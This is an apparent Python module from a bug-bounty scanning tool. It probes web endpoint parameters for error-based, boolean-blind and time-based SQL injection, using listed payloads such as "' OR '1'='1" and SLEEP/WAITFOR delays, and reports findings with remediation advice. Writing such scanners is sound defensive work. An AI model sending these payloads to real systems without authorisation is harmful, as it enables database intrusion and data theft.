"""
SQL Injection Scanner
======================

Tests for:
- Error-based SQLi
- Boolean-based blind SQLi
- Time-based blind SQLi
- UNION-based SQLi indicators
"""

from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from bbhunter.engines.scanner.base_scanner import BaseScanner
from bbhunter.logger import get_logger
from bbhunter.models import Endpoint, Severity, Vulnerability, VulnCategory

logger = get_logger()


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner."""

    CATEGORY = VulnCategory.SQLI

    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        '"',
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 OR 1=1",
        "1 OR 1=2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "') OR ('1'='1",
        "1; SELECT 1--",
    ]

    # Time-based payloads
    TIME_PAYLOADS = [
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        "1' AND SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
    ]

    # SQL error patterns
    SQL_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL[\s-]*Server",
        r"OLE DB.*SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"SQL Server.*[0-9a-fA-F]{8}",
        r"Warning.*mssql_",
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
        r"ORA-[0-9]{5}",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"SQLite.*(?:Exception|Error)",
        r"Warning.*sqlite_",
        r"SQLITE_ERROR",
        r"(?i)you have an error in your sql syntax",
        r"(?i)unclosed quotation mark",
        r"(?i)quoted string not properly terminated",
        r"(?i)syntax error.*sql",
    ]

    TIME_THRESHOLD = 4.5  # seconds (payload sleeps for 5)

    async def scan(
        self,
        endpoints: list[Endpoint],
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Scan endpoints for SQL injection."""
        vulnerabilities: list[Vulnerability] = []
        
        for endpoint in endpoints:
            for param in endpoint.parameters:
                vulns = await self._test_parameter(endpoint, param.name, target_id, scan_id)
                vulnerabilities.extend(vulns)

        return vulnerabilities

    async def _test_parameter(
        self,
        endpoint: Endpoint,
        param_name: str,
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Test a parameter for SQL injection."""
        vulns = []
        parsed = urlparse(endpoint.url)

        # Phase 1: Error-based detection
        for payload in self.ERROR_PAYLOADS:
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            test_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            resp = await self._send_request(test_url)
            if resp is None:
                continue

            body = resp.text

            # Check for SQL error messages
            for pattern in self.SQL_ERRORS:
                if re.search(pattern, body, re.IGNORECASE):
                    vuln = self._create_vulnerability(
                        target_id=target_id,
                        scan_id=scan_id,
                        title=f"Error-based SQL Injection in '{param_name}'",
                        severity=Severity.CRITICAL,
                        url=endpoint.url,
                        parameter=param_name,
                        payload=payload,
                        evidence=self._extract_sql_error(body, pattern),
                        description=(
                            f"SQL error messages are disclosed when injecting SQL syntax "
                            f"into the '{param_name}' parameter, indicating a SQL injection vulnerability."
                        ),
                        impact=(
                            "An attacker can extract, modify, or delete data from the database. "
                            "In severe cases, this can lead to OS command execution, "
                            "authentication bypass, and full system compromise."
                        ),
                        remediation=(
                            "Use parameterized queries (prepared statements). "
                            "Implement input validation. Disable detailed error messages in production. "
                            "Apply the principle of least privilege to database accounts."
                        ),
                        confidence=0.85,
                        request=f"GET {test_url}",
                        response=f"HTTP {resp.status_code}\n{body[:500]}",
                        steps=[
                            f"Send request to: {test_url}",
                            f"Observe SQL error in response body",
                        ],
                    )
                    vulns.append(vuln)
                    return vulns  # Confirmed, no need for more testing

        # Phase 2: Boolean-based blind detection
        bool_vuln = await self._boolean_blind_test(endpoint, param_name, target_id, scan_id)
        if bool_vuln:
            vulns.append(bool_vuln)
            return vulns

        # Phase 3: Time-based blind detection
        time_vuln = await self._time_blind_test(endpoint, param_name, target_id, scan_id)
        if time_vuln:
            vulns.append(time_vuln)

        return vulns

    async def _boolean_blind_test(
        self, endpoint: Endpoint, param_name: str, target_id: str, scan_id: str
    ) -> Vulnerability | None:
        """Test for boolean-based blind SQL injection."""
        parsed = urlparse(endpoint.url)
        original_params = parse_qs(parsed.query)
        original_value = original_params.get(param_name, ["1"])[0]

        # True condition
        true_payload = f"{original_value}' AND '1'='1"
        params_true = dict(original_params)
        params_true[param_name] = [true_payload]
        true_url = urlunparse(parsed._replace(query=urlencode(params_true, doseq=True)))

        # False condition
        false_payload = f"{original_value}' AND '1'='2"
        params_false = dict(original_params)
        params_false[param_name] = [false_payload]
        false_url = urlunparse(parsed._replace(query=urlencode(params_false, doseq=True)))

        resp_true = await self._send_request(true_url)
        resp_false = await self._send_request(false_url)

        if resp_true and resp_false:
            # Significant difference in response length indicates boolean blind SQLi
            len_true = len(resp_true.text)
            len_false = len(resp_false.text)
            
            if abs(len_true - len_false) > 50 and resp_true.status_code == resp_false.status_code:
                return self._create_vulnerability(
                    target_id=target_id,
                    scan_id=scan_id,
                    title=f"Boolean-based Blind SQL Injection in '{param_name}'",
                    severity=Severity.CRITICAL,
                    url=endpoint.url,
                    parameter=param_name,
                    payload=true_payload,
                    description="Different response content for TRUE vs FALSE SQL conditions.",
                    confidence=0.65,
                    steps=[
                        f"TRUE condition: {true_url} (response length: {len_true})",
                        f"FALSE condition: {false_url} (response length: {len_false})",
                        f"Difference: {abs(len_true - len_false)} bytes",
                    ],
                )
        return None

    async def _time_blind_test(
        self, endpoint: Endpoint, param_name: str, target_id: str, scan_id: str
    ) -> Vulnerability | None:
        """Test for time-based blind SQL injection."""
        parsed = urlparse(endpoint.url)

        # Baseline timing
        start = time.time()
        await self._send_request(endpoint.url)
        baseline = time.time() - start

        for payload in self.TIME_PAYLOADS:
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            start = time.time()
            resp = await self._send_request(test_url)
            elapsed = time.time() - start

            if elapsed > self.TIME_THRESHOLD and elapsed > baseline * 3:
                return self._create_vulnerability(
                    target_id=target_id,
                    scan_id=scan_id,
                    title=f"Time-based Blind SQL Injection in '{param_name}'",
                    severity=Severity.CRITICAL,
                    url=endpoint.url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline:.2f}s)",
                    confidence=0.75,
                    steps=[
                        f"Baseline response time: {baseline:.2f}s",
                        f"Payload response time: {elapsed:.2f}s",
                        f"Time difference: {elapsed - baseline:.2f}s",
                    ],
                )
        return None

    def _extract_sql_error(self, body: str, pattern: str) -> str:
        """Extract SQL error context from response."""
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 50)
            end = min(len(body), match.end() + 100)
            return body[start:end]
        return ""
